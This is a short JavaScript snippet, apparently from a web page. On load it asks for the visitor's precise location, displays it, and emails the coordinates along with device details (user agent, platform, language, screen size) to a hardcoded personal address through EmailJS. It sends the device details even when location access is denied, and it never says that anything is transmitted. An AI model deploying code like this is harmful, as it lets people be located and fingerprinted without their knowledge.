
    window.onload = function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        showError("Geolocation is not supported by this browser.");
      }
    };

    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      console.log("📍 Latitude:", latitude);
      console.log("📍 Longitude:", longitude);

      document.getElementById("demo").innerHTML =
        `✅ Latitude: ${latitude}<br>✅ Longitude: ${longitude}`;

      sendInfo(latitude, longitude);
    }

    function error(err) {
      console.warn("⚠️ Geolocation error:", err);
      document.getElementById("demo").innerHTML =
        "⚠️ Location access denied or not available.";
      sendInfo("Not Available", "Not Available");
    }

    function sendInfo(latitude, longitude) {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const screenSize = `${window.screen.width}x${window.screen.height}`;

      emailjs.send("service_3101r0c", "template_ol182re", {
        name: "John Doe",
        latitude: latitude,
        longitude: longitude,
        to_email: "c_nedea9@yahoo.com",
        message: "This is the user location and device info.",
        user_agent: userAgent,
        platform: platform,
        language: language,
        screen_size: screenSize,
      }).then(
        function (response) {
          console.log("✅ Email sent:", response);
        },
        function (error) {
          console.error("❌ Email send failed:", error);
        }
      );
    }
